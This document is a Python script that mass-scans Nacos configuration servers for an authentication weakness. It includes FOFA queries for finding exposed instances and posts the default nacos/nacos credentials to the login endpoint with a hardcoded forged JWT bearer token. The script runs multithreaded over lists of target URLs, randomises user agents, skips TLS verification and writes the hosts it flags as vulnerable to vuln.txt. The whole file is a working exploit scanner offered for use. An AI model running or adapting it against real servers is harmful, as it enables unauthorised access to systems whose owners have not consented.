# -*- coding: utf-8 -*-
from urllib.parse import urlsplit
import argparse
import requests
import sys
import re
import threadpool
from requests.exceptions import RequestException
from urllib3.exceptions import InsecureRequestWarning
import random
from time import time
#fofa：app="NACOS"
#fofa：title="nacos"

jwt_token_str="eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTczNzM2OTU4NH0.tSTcxnkHsuwzVKUUAaZj4-WjJKnIYqTkR7G7Ll3f6XY"

def get_ua():
    first_num = random.randint(55, 62)
    third_num = random.randint(0, 3200)
    fourth_num = random.randint(0, 140)
    os_type = [
        '(Windows NT 6.1; WOW64)', '(Windows NT 10.0; WOW64)',
        '(Macintosh; Intel Mac OS X 10_12_6)'
    ]
    chrome_version = 'Chrome/{}.0.{}.{}'.format(first_num, third_num, fourth_num)

    ua = ' '.join(['Mozilla/5.0', random.choice(os_type), 'AppleWebKit/537.36',
                   '(KHTML, like Gecko)', chrome_version, 'Safari/537.36']
                  )
    return ua

def wirte_targets(vurl, filename):
    with open(filename, "a+") as f:
        f.write(vurl + "\n")

# 自定义请求头字段
headers = {
    "User-Agent": get_ua(),
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7",
    "Authorization": "Bearer "+jwt_token_str
}


data = {
    "username":"nacos",
    "password":"nacos"
    }

proxies={'http': 'http://127.0.0.1:8080',
        'https': 'https://127.0.0.1:8080'}

vulurl=[]
url_list=[]

#url合规检测执行
def urltest(url):
    parsed_url = urlsplit(url)
    if parsed_url.port == "443" and parsed_url.netloc:
        url="https://"+parsed_url.netloc+"/nacos/v1/auth/users/login"
      #  print(1)
        vultest(url) 
    if parsed_url.netloc and parsed_url.path:
        url=parsed_url.scheme+"://"+parsed_url.netloc+"/nacos/v1/auth/users/login"
       # print(2)
        vultest(url)
    elif parsed_url.netloc:
        url=url+"/nacos/v1/auth/users/login"
       # print(3)
        vultest(url)
    elif (not parsed_url.scheme) and parsed_url.path:
        url_1="http://"+url+"/nacos/v1/auth/users/login"
       # print(4)
        vultest(url_1)
        url_2="https://"+url+"/nacos/v1/auth/users/login"
       # print(5)
        vultest(url_2)
    else:
        modified_string = re.sub(r"[/\\].*", "/nacos/v1/auth/users/login", url)
        url_1="http://"+modified_string
        #print(6)
        vultest(url_1)
        url_2="https://"+modified_string
        #print(7)
        vultest(url_2)

#漏洞检测
def vultest(url):
    try:
        response = requests.post(url, data=data, headers=headers,verify=False , timeout=3)
        # 检查响应头的状态码是否为200
        if response.status_code == 200 and ("Authorization" in response.headers):
            vulurl.append(url)
            print(url+"  [+]漏洞存在！！！")
            wirte_targets(url,"vuln.txt")
        else:
            print(url+"  [-]漏洞不存在。")
    except RequestException:
        print(url+"  [-]请求失败。")


#多线程
def multithreading(url_list, pools=10):
    works = []
    for i in url_list:
        # works.append((func_params, None))
        works.append(i)
    # print(works)
    pool = threadpool.ThreadPool(pools)
    reqs = threadpool.makeRequests(urltest, works)
    [pool.putRequest(req) for req in reqs]
    pool.wait()

#读取url或file
def main():
    # 禁用警告
    requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
    parser = argparse.ArgumentParser(description="Nacos_check By bboy")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-u', '--url', help='Target URL; Example:http://ip:port')
    group.add_argument('-f', '--file', help='Target URL; Example:url.txt')
    args = parser.parse_args()
    url=args.url
    filename=args.file
    print("[+]任务开始.....")
    start=time()
    if args.url:
        urltest(args.url)
    elif args.file:
        for i in open(filename):
            i=i.replace('\n','')
            url_list.append(i)
        multithreading(url_list,30)
    print("存在漏洞列表：")
    for url in vulurl:
        print(url+"  [+]漏洞存在！！！")
    end=time()
    print('任务完成,用时%ds.' %(end-start))
if __name__ == "__main__":
    main()
